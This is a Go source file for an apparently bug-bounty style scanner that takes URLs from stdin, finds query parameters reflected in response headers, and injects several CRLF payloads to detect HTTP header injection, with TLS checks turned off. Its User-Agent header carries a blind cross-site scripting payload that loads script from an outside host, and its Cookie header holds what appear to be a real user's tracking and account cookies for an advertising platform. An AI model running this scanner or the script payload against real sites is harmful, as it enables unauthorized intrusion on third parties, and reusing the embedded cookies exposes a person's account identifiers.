package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	//"io/ioutil"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

type paramCheck struct {
	url   string
	param string
}

var transport = &http.Transport{
	TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	DialContext: (&net.Dialer{
		Timeout:   30 * time.Second,
		KeepAlive: time.Second,
		DualStack: true,
	}).DialContext,
}

var httpClient = &http.Client{
	Transport: transport,
}

func main() {

	httpClient.CheckRedirect = func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}

	sc := bufio.NewScanner(os.Stdin)

	initialChecks := make(chan paramCheck, 40)

	appendChecks := makePool(initialChecks, func(c paramCheck, output chan paramCheck) {
		reflected, err := checkReflected(c.url)

		if err != nil {
			fmt.Fprintf(os.Stderr, "error from checkReflected: %s\n", err)
			return
		}

		//if len(reflected) == 0 {
			// TODO: wrap in verbose mode
			//fmt.Printf("no params were reflected in %s\n", c.url)
			//return
		//}
		for _, param := range reflected {
			output <- paramCheck{c.url, param}
		}
	})

	charChecks := makePool(appendChecks, func(c paramCheck, output chan paramCheck) {
		//wasReflected, err := checkAppend(c.url, c.param, "/iy3j4h234hjb23234")
		//if err != nil {
		//	fmt.Fprintf(os.Stderr, "error from checkAppend for url %s with param %s: %s", c.url, c.param, err)
		//	return
		//}

		//if wasReflected {
		//	output <- paramCheck{c.url, c.param}
		//}
		output <- paramCheck{c.url, c.param}
	})

	done := makePool(charChecks, func(c paramCheck, output chan paramCheck) {
		output_of_url := []string{c.url, c.param}
		for _, char := range []string{"%0d%0aquasimoto: has-crlf", "\r\nquasimoto: has-crlf", "\r\n\r\nquasimoto: has-crlf", "\nquasimoto: has-crlf", "\rquasimoto: has-crlf"} {
			wasReflected, err := checkAppend(c.url, c.param, char+"asuffix")
			if err != nil {
				//fmt.Fprintf(os.Stderr, "error from checkAppend for url %s with param %s with %s: %s", c.url, c.param, char, err)
				continue
			}

			if wasReflected {
				output_of_url = append(output_of_url, url.QueryEscape(char))
			}
		}
		if len(output_of_url) >= 2 {
			fmt.Printf("URL: %s Param: %s Payload: %v \n", output_of_url[0] , output_of_url[1],output_of_url[2:])
		}
	})

	for sc.Scan() {
		initialChecks <- paramCheck{url: sc.Text()}
	}

	close(initialChecks)
	<-done
}

func checkReflected(targetURL string) ([]string, error) {

	out := make([]string, 0)

	req, err := http.NewRequest("GET", targetURL, nil)
	//if err != nil {
	//	return out, err
	//}

	// temporary. Needs to be an option
	req.Header.Add(
            "User-Agent",
            "User-Agent: Mozilla/5.0 (X11; Linux x86_64) \"'></script><script/src=//https://q.quas.sh/></script> AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.100 Safari/537.36"
        )
	req.Header.Add("Cookie", "Cookie: optimizelyEndUserId=oeu1612654619663r0.30642883604754745; optimizelySegments=%7B%222229771298%22%3A%22true%22%2C%227244600225%22%3A%22true%22%7D; optimizelyBuckets=%7B%7D; ajs_anonymous_id=%224c5bb9ed-f4c9-4010-9752-3e15429d213c%22; _hp2_id.1766097971=%7B%22userId%22%3A%223744053068798800%22%2C%22pageviewId%22%3A%226972598715416533%22%2C%22sessionId%22%3A%222138424659897959%22%2C%22identity%22%3A%22BYZHZGP2SJEUBAEPH3TC46%22%2C%22trackerVersion%22%3A%224.0%22%2C%22identityField%22%3Anull%2C%22isIdentified%22%3A1%7D; __adroll=433075f5d1737881c3af3190fd19080f-a_1612654622; __adroll_shared=433075f5d1737881c3af3190fd19080f-a_1612654622; _ga=GA1.2.1502284767.1612654623; fs_uid=rs.fullstory.com#M25YJ#5678935830675456:5720969343213568#58d277f6#/1644190622; _hjid=58bfbd35-5ae0-4453-9aed-52fcef3e1699; _fbp=fb.1.1612654623409.288354551; _hp2_props.1766097971=%7B%22telemetry_version%22%3A%22__VERSION__%22%2C%22location_pathname%22%3A%22%2Fsendroll%2Fembed%2Fsettings%22%2C%22advertisable%22%3A%22OSQVKZXC3RAJPBQFAOIVEE%22%2C%22organization%22%3A%22KJ3MTHSSLBCLBDG2VBKO5H%22%2C%22business_unit%22%3A%22adroll%22%2C%22advertisable_use_universal_campaigns%22%3Afalse%2C%22advertisable_name%22%3A%22Kushtomized%22%2C%22advertisable_url%22%3A%22https%3A%2F%2Fnirvanahub.com%2F%22%2C%22advertisable_currency%22%3A%22USD%22%2C%22advertisable_default_homepage%22%3A%22legacy_dash%22%2C%22advertisable_homepage_enabled%22%3Afalse%2C%22user%22%3A%22BYZHZGP2SJEUBAEPH3TC46%22%2C%22user_role%22%3A%22user%22%2C%22user_locale%22%3A%22en_US%22%2C%22app_version%22%3A%220a54a924e7f099c32c21dbb81540b9c2ba72347f%22%7D; ajs_user_id=%22BYZHZGP2SJEUBAEPH3TC46%22; ajs_group_id=%22OSQVKZXC3RAJPBQFAOIVEE%22; __zlcmid=12WjnATPrjaBssZ; _vwo_uuid_v2=DE4311523E21779229824E8948223F8D8|7085f4444f89ea3d2540eb49e701495c; _vis_opt_s=2%7C; _vwo_uuid=DE4311523E21779229824E8948223F8D8; _mkto_trk=id:964-WFU-818&token:_mch-adroll.com-1613683917453-44355; _gcl_au=1.1.1264850648.1623631442; _uetvid=63433740ba8111eb8b5903a4466c5020")

	resp, err := httpClient.Do(req)
	if err != nil {
		return out, err
	}
	//if resp.Body == nil {
	//	return out, err
	//}
	defer resp.Body.Close()

	// always read the full body so we can re-use the tcp connection
	//b, err := ioutil.ReadAll(resp.Body)
	//if err != nil {
	//	return out, err
	//}

	// nope (:
	//if strings.HasPrefix(resp.Status, "3") {
	//	return out, nil
	//}

	// also nope
	//ct := resp.Header.Get("Content-Type")
	//if ct != "" && !strings.Contains(ct, "html") {
	//	return out, nil
	//}
	//loc := string(resp.Header.Get("Location"))
	//fmt.Printf(loc)
	//body := string(b)
	//if body == "" {
	//	return out, err
	//}

	u, err := url.Parse(targetURL)
	if err != nil {
		return out, err
	}
	//schemhost := string(u.Scheme) + "://" +  string(u.Host)
	for key, vv := range u.Query() {
		for _, v := range vv {
			for _, headervalue := range resp.Header{
				if !strings.Contains(headervalue[0], v) {
					continue
				}

				out = append(out, key)
			}
		}
	}

	return out, nil
}

func checkCRLF(targetURL string) ([]string, error) {

	out := make([]string, 0)

	req, err := http.NewRequest("GET", targetURL, nil)
	//if err != nil {
	//	return out, err
	//}

	// temporary. Needs to be an option
	req.Header.Add("User-Agent", "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.100 Safari/537.36")
	req.Header.Add("Cookie", "Cookie: optimizelyEndUserId=oeu1612654619663r0.30642883604754745; optimizelySegments=%7B%222229771298%22%3A%22true%22%2C%227244600225%22%3A%22true%22%7D; optimizelyBuckets=%7B%7D; ajs_anonymous_id=%224c5bb9ed-f4c9-4010-9752-3e15429d213c%22; _hp2_id.1766097971=%7B%22userId%22%3A%223744053068798800%22%2C%22pageviewId%22%3A%226972598715416533%22%2C%22sessionId%22%3A%222138424659897959%22%2C%22identity%22%3A%22BYZHZGP2SJEUBAEPH3TC46%22%2C%22trackerVersion%22%3A%224.0%22%2C%22identityField%22%3Anull%2C%22isIdentified%22%3A1%7D; __adroll=433075f5d1737881c3af3190fd19080f-a_1612654622; __adroll_shared=433075f5d1737881c3af3190fd19080f-a_1612654622; _ga=GA1.2.1502284767.1612654623; fs_uid=rs.fullstory.com#M25YJ#5678935830675456:5720969343213568#58d277f6#/1644190622; _hjid=58bfbd35-5ae0-4453-9aed-52fcef3e1699; _fbp=fb.1.1612654623409.288354551; _hp2_props.1766097971=%7B%22telemetry_version%22%3A%22__VERSION__%22%2C%22location_pathname%22%3A%22%2Fsendroll%2Fembed%2Fsettings%22%2C%22advertisable%22%3A%22OSQVKZXC3RAJPBQFAOIVEE%22%2C%22organization%22%3A%22KJ3MTHSSLBCLBDG2VBKO5H%22%2C%22business_unit%22%3A%22adroll%22%2C%22advertisable_use_universal_campaigns%22%3Afalse%2C%22advertisable_name%22%3A%22Kushtomized%22%2C%22advertisable_url%22%3A%22https%3A%2F%2Fnirvanahub.com%2F%22%2C%22advertisable_currency%22%3A%22USD%22%2C%22advertisable_default_homepage%22%3A%22legacy_dash%22%2C%22advertisable_homepage_enabled%22%3Afalse%2C%22user%22%3A%22BYZHZGP2SJEUBAEPH3TC46%22%2C%22user_role%22%3A%22user%22%2C%22user_locale%22%3A%22en_US%22%2C%22app_version%22%3A%220a54a924e7f099c32c21dbb81540b9c2ba72347f%22%7D; ajs_user_id=%22BYZHZGP2SJEUBAEPH3TC46%22; ajs_group_id=%22OSQVKZXC3RAJPBQFAOIVEE%22; __zlcmid=12WjnATPrjaBssZ; _vwo_uuid_v2=DE4311523E21779229824E8948223F8D8|7085f4444f89ea3d2540eb49e701495c; _vis_opt_s=2%7C; _vwo_uuid=DE4311523E21779229824E8948223F8D8; _mkto_trk=id:964-WFU-818&token:_mch-adroll.com-1613683917453-44355; _gcl_au=1.1.1264850648.1623631442; _uetvid=63433740ba8111eb8b5903a4466c5020")

	resp, err := httpClient.Do(req)
	if err != nil {
		return out, err
	}
	//if resp.Body == nil {
	//	return out, err
	//}
	defer resp.Body.Close()

	// always read the full body so we can re-use the tcp connection
	//b, err := ioutil.ReadAll(resp.Body)
	//if err != nil {
	//	return out, err
	//}

	// nope (:
	//if strings.HasPrefix(resp.Status, "3") {
	//	return out, nil
	//}

	// also nope
	//ct := resp.Header.Get("Content-Type")
	//if ct != "" && !strings.Contains(ct, "html") {
	//	return out, nil
	//}
	//loc := string(resp.Header.Get("Location"))
	//fmt.Printf(loc)
	//body := string(b)
	//if body == "" {
	//	return out, err
	//}

	u, err := url.Parse(targetURL)
	if err != nil {
		return out, err
	}
	//schemhost := string(u.Scheme) + "://" +  string(u.Host)
	for key, _ := range u.Query() {
		//for _, v := range vv {
			for headerkey, _ := range resp.Header {
				//fmt.Printf(strings.ToLower(headerkey)+"\r\n")
				if !strings.Contains(strings.ToLower(headerkey), "quasimoto") {
					continue
				}

				out = append(out, key)
			}
			
		//}
	}
	

	return out, nil
}

func checkAppend(targetURL, param, suffix string) (bool, error) {
	u, err := url.Parse(targetURL)
	if err != nil {
		return false, err
	}

	qs := u.Query()
	//val := qs.Get(param)
	//if val == "" {
	//return false, nil
	//return false, fmt.Errorf("can't append to non-existant param %s", param)
	//}

	qs.Set(param, suffix)
	u.RawQuery = qs.Encode()

	reflected, err := checkCRLF(u.String())
	if err != nil {
		return false, err
	}

	for _, r := range reflected {
		if r == param {
			return true, nil
		}
	}

	return false, nil
}

type workerFunc func(paramCheck, chan paramCheck)

func makePool(input chan paramCheck, fn workerFunc) chan paramCheck {
	var wg sync.WaitGroup

	output := make(chan paramCheck)
	for i := 0; i < 40; i++ {
		wg.Add(1)
		go func() {
			for c := range input {
				fn(c, output)
			}
			wg.Done()
		}()
	}

	go func() {
		wg.Wait()
		close(output)
	}()

	return output
}
